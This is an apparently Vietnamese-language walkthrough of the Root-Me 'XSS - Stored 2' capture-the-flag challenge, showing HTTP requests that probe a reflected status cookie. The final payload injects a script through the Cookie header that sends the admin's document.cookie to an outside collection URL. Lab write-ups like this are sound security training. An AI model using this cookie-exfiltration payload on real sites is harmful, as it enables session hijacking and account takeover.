<main class="main" role="main">
    <div class="content">
        <article id="post-xss/xss_chall2" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    XSS - Stored 2
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               </div>
            </div>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="Thu-Thach"><a href="#Thu-Thach" class="headerlink" title="Thử Thách"></a>Thử Thách</h1>
                <p>URL: <a href="https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2</a></p>
                <h2 id="Tieu-de"><a href="#Tieu-de" class="headerlink" title="Tiêu đề"></a>Tiêu đề</h2>
                <p>Author</p>
                <h2 id="Mo-ta"><a href="#Mo-ta" class="headerlink" title="Mô tả"></a>Mô tả</h2>
                <p>Steal the administrator session’s cookie and go in the admin section.</p>
                <button id="read-writeup"><span><img src="public/images/more.png" /></span>Xem Hướng Dẫn</button>
                <p style="color: red; margin-left: 10px; font-weight: bold">Hãy cố gắng tự làm bằng hết sức mình trước, xem hướng dẫn ngay từ đầu thì bạn sẽ mất nhiều thứ đó..</p>
                <script type="text/javascript">
                    $(document).ready(function(){
                        $("#read-writeup").click(function(){
                            $("#w-content").toggle();
                        });
                    });
                </script>
                <div id="w-content" style="display: none">
                <h1 id="Huong-Dan"><a href="#Huong-Dan" class="headerlink" title="Hướng Dẫn"></a>Hướng Dẫn</h1>
                <h3 id="Muc-tieu-tan-cong"><a href="#Muc-tieu-tan-cong" class="headerlink" title="Mục tiêu tấn công"></a>Mục tiêu tấn công</h3>
                <p>Vậy mục tiêu của chúng ta là lấy cookie sau đó nhờ đó mà đánh cắp sesssion của admin.<br>Cookie chính là flag.</p>
                <h3 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="Phân tích"></a>Phân tích</h3>
                <p>Thấy 2 input có thể truyền vào là tilte và message, nhưng khi trả về đã bị encode sang html entities.<br>Do đó,ta cần một kênh tấn công khác, người dùng có thể chỉnh sửa lại được.</p>
                <h2 id="De-y-trong-goi-tin-request"><a href="#De-y-trong-goi-tin-request" class="headerlink" title="Để ý trong gói tin request."></a>Để ý trong gói tin request.</h2>
                <figure class="highlight bash">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">GET /web-client/ch19/?section=admin HTTP/1.1</span><br><span class="line">Host: challenge01.root-me.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Cookie: status=invite</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Để ý thấy trường <strong>Cookie: status=invite</strong></p>
                <p>Trong trang trả về cũng có: <strong>Status : invite</strong> ở góc phải trang.</p>
                <h2 id="Cookie-la-mot-kenh-input-ma-nguoi-dung-co-the-can-thiep"><a href="#Cookie-la-mot-kenh-input-ma-nguoi-dung-co-the-can-thiep" class="headerlink" title="Cookie là một kênh input mà người dùng có thể can thiệp"></a>Cookie là một kênh input mà người dùng có thể can thiệp</h2>
                <p>Ta thử chèn vào, <strong>Cookie: status=&lt;script&gt;”&gt;</strong> với trường GET<br></p>
                <figure class="highlight bash">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">GET /web-client/ch19/ HTTP/1.1</span><br><span class="line">Host: challenge01.root-me.org</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Cookie: status=status=&lt;script&gt;</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Không may là nó cũng bị encode sang html entities nốt.<br>Ta để ý, không chỉ một lần nó in ra <strong>invite</strong> mà là 2 lần, 1 lần là class name, 1 lần là text:<br>Cấu trúc hiển thị ra của nó sẽ là:</p>
                <blockquote>
                    <p>Status : &lt;i class=”invite”&gt;invite&lt;/i&gt;<br>Do đó,ta cần thêm <strong>“&gt;</strong> để nó tạo phá vỡ cấu trúc của class.<br><strong>Cookie: status=admin”&gt;&lt;script&gt;”&gt;</strong></p>
                </blockquote>
                <p>Tuy nhiên,vẫn bị mã hoá.</p>
                <h2 id="Khong-chi-1-cho-hien-thi-Status-invite"><a href="#Khong-chi-1-cho-hien-thi-Status-invite" class="headerlink" title="Không chỉ 1 chỗ hiển thị: Status : invite"></a>Không chỉ 1 chỗ hiển thị: <strong>Status : invite</strong></h2>
                <p>Thử gửi thử 1 tin nhắn,hoá ra nó cũng có invite, ta lại tiếp tục thử.<br></p>
                <figure class="highlight bash">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">POST /web-client/ch19/ HTTP/1.1</span><br><span class="line">Host: challenge01.root-me.org</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-GB,en;q=0.5</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 19</span><br><span class="line">Referer: http://challenge01.root-me.org/web-client/ch19/</span><br><span class="line">Cookie: status=abc<span class="string">"&gt;&lt;script&gt;</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">titre=ab&amp;message=cd</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Lần này ta crt +u lên và search &lt;script&gt; thì thấy nó chưa bị mã hoá. Vậy là ngon lành rồi.</p>
                <h2 id="Hoan-thanh-payload"><a href="#Hoan-thanh-payload" class="headerlink" title="Hoàn thành payload"></a>Hoàn thành payload</h2>
                <p>Ta chèn đoạn script XSS vào form POST phía trên:<br></p>
                <figure class="highlight html">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line">Cookie: status=admin"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">new Image().src="https://vuongthieuis.000webhostapp.com/getcookie.php?cookie="+document.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <h2 id="Thanh-cong"><a href="#Thanh-cong" class="headerlink" title="Thành công."></a>Thành công.</h2>
                </div></div>
        </article>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>